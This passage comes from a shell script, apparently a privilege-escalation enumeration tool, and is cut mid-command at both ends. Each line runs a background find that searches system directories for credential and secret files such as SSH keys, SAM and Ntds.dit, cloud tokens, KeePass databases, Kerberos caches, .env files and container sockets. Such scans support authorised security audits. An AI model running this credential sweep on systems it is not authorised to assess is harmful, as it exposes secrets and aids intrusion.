-name \"sess_*\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"webserver_config.py\" -o -name \"AzureRMContext.json\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1163	  FIND_RUN=`eval_bckgrd "find ${ROOT_FOLDER}run -name \"*.socket\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1164	  FIND_SBIN=`eval_bckgrd "find ${ROOT_FOLDER}sbin -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1165	  FIND_SNAP=`eval_bckgrd "find ${ROOT_FOLDER}snap -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1166	  FIND_SRV=`eval_bckgrd "find ${ROOT_FOLDER}srv -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1167	  FIND_SYS=`eval_bckgrd "find ${ROOT_FOLDER}sys -name \"*.socket\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1168	  FIND_SYSTEM=`eval_bckgrd "find ${ROOT_FOLDER}system -name \"*.socket\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1169	  FIND_SYSTEMD=`eval_bckgrd "find ${ROOT_FOLDER}systemd -name \"rocketchat.service\" -o -name \"*.socket\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1170	  FIND_TMP=`eval_bckgrd "find ${ROOT_FOLDER}tmp -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \"agent*\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"sess_*\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name 